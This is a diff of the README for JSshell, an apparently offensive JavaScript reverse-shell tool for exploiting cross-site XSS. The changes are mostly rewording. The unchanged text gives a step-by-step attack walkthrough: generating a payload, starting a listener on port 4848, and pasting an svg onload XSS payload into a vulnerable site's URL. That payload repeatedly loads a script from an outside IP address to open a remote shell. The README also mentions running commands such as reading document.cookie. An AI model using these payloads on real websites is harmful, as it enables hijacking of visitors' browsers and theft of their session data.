@@ -2,9 +2,7 @@
 JSshell - a JavaScript reverse shell. This using for exploit XSS remotely, help to find blind XSS, ...
 
 This tool works for both Unix and Windows operating system and it can running with both Python 2 and Python 3. This is 
-a big update of JShell - a tool to get a JavaScript shell with XSS by s0med3v, but no longer work now because the behavior
-of new browsers. JSshell also doesn't require Netcat. Although JSshell working for both Unix and Windows, on Unix OS, JSshell 
-still has colors.
+a big update of JShell - a tool to get a JavaScript shell with XSS by s0med3v. JSshell also doesn't require Netcat (different from other javascript shells).
 
 # Usage
 #### Generate JS reverse shell payload:  `-g`
@@ -21,8 +19,9 @@ still has colors.
 - `js.py -c "alert(document.cookie)" -w 10`
 
 #### Running JSshell example:
-This is an example for step by step exploit remote XSS using JSshell.
-First we will generate a reverse JS shell and set the timeout is 20 seconds:
+This is an example for step-by-step to exploit remote XSS using JSshell.
+
+First we will generate a reverse JS shell payload and set the shell timeout is 20 seconds:
 
 ```
 # whoami
@@ -41,7 +40,7 @@ Payload:
 Listening on [any] 4848 for incoming JS shell ...
 ```
 
-Now paste this payload to a website that vulnerable to XSS:
+Now paste this payload to the website (or URL) that vulnerable to XSS:
 
 `https://vulnwebs1te.com/b/search?q=<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>`
 
@@ -96,9 +95,9 @@ And we quited!
 
 
 # Author
-This created by shelld3v, hacking at HackOne and Bugcrowd with a secret account! This tool is inspired by JShell (s0med3v). Using the BruteLogic payload. JSshell 2.0 will has some new features that include:
+This created by shelld3v, hacking at HackOne and Bugcrowd with a secret account! This tool is inspired by JShell (s0med3v), using the BruteLogic payload. JSshell 2.0 will has some new features that include:
 
-- Payloads for `<img>`, `<script>`, ...
+- More payloads for `<img>`, `<script>`, ...
 - Some shortcut commands: print the current session, domain, endpoint, ...
-- Better GUI
+- Better GUI  
 ...
